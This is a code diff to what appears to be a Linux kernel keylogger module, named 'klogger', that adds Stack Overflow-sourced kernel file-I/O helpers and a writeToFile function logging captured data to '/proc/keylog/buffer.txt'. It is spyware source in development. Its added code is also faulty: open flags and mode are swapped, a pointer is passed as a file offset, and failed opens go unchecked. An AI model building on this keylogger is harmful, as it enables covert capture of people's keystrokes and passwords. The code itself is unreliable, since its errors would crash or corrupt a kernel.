@@ -2,9 +2,78 @@
 
 #include <linux/kernel.h>
 #include <asm/uaccess.h>
-
+//stackoverflow includes start
+#include <linux/fs.h>
+#include <asm/segment.h>
+#include <asm/uaccess.h>
+#include <linux/buffer_head.h>
+//stackoverflow includes end
 #include "klogger.h"
 
+
+//stackoverflow code start
+struct file* file_open(const char* path, int flags, int rights) {
+    struct file* filp = NULL;
+    mm_segment_t oldfs;
+    int err = 0;
+
+    oldfs = get_fs();
+    set_fs(get_ds());
+    filp = filp_open(path, flags, rights);
+    set_fs(oldfs);
+    if(IS_ERR(filp)) {
+        err = PTR_ERR(filp);
+        return NULL;
+    }
+    return filp;
+}
+
+void file_close(struct file* file) {
+    filp_close(file, NULL);
+}
+
+int file_read(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size) {
+    mm_segment_t oldfs;
+    int ret;
+
+    oldfs = get_fs();
+    set_fs(get_ds());
+
+    ret = vfs_read(file, data, size, &offset);
+
+    set_fs(oldfs);
+    return ret;
+}  
+
+int file_write(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size) {
+    mm_segment_t oldfs;
+    int ret;
+
+    oldfs = get_fs();
+    set_fs(get_ds());
+
+    ret = vfs_write(file, data, size, &offset);
+
+    set_fs(oldfs);
+    return ret;
+}
+
+int file_sync(struct file* file) {
+    vfs_fsync(file, 0);
+    return 0;
+}
+//stackoverflow code end
+
+//my code start
+void writeToFile(char* data)
+{
+    //first step is to open the file
+    //use O_CREAT flag to create file if it doesn't exist
+    struct file* file = file_open("/proc/keylog/buffer.txt", O_APPEND, O_RDWR);
+    int writeStatus = file_write(file, &file->f_pos, data, strlen(data));
+    int syncStatus = file_sync(file);
+    
+}
 int klg_init(void) {
 	int result;
 
